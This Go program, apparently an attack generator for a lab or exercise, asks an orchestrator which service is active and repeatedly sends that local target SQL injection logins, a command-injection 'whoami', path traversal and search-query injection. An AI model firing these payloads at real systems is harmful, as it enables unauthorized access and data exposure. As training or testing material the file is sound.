package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"
)

func env(k, d string) string {
	v := os.Getenv(k)
	if v == "" {
		return d
	}
	return v
}

func activeService(orch string) string {
	resp, err := http.Get(orch + "/current")
	if err != nil {
		return "web"
	}
	defer resp.Body.Close()
	var data map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return "web"
	}
	svc, ok := data["service"].(string)
	if !ok || svc == "" {
		svc, ok = data["active_service"].(string)
	}
	if !ok || svc == "" {
		return "web"
	}
	return svc
}

func main() {
	orch := env("ORCH", env("ORCHESTRATOR_URL", "http://orchestrator:9000"))
	target := env("MY_TARGET", "http://localhost:9100")

	fmt.Println("[attacker.go] started")
	for {
		svc := activeService(orch)
		var reqURL string
		var body any

		switch svc {
		case "web":
			reqURL = target + "/web/login"
			body = map[string]string{"username": "admin' OR '1'='1", "password": "x"}
		case "api":
			reqURL = target + "/api/run"
			body = map[string]string{"cmd": "whoami"}
		case "file":
			reqURL = target + "/file/download?file=../files/sample.txt"
		case "db":
			reqURL = target + "/db/query"
			body = map[string]string{"search": "' OR '1'='1"}
		default:
			reqURL = target + "/web/search?q=%27%20OR%20%271%27%3D%271"
		}

		if body != nil {
			payload, _ := json.Marshal(body)
			resp, err := http.Post(reqURL, "application/json", bytes.NewBuffer(payload))
			if err != nil {
				fmt.Println("attack error:", err)
			} else {
				fmt.Println("attack", svc, "->", resp.StatusCode)
				resp.Body.Close()
			}
		} else {
			resp, err := http.Get(reqURL)
			if err != nil {
				fmt.Println("attack error:", err)
			} else {
				fmt.Println("attack", svc, "->", resp.StatusCode)
				resp.Body.Close()
			}
		}
		time.Sleep(3 * time.Second)
	}
}
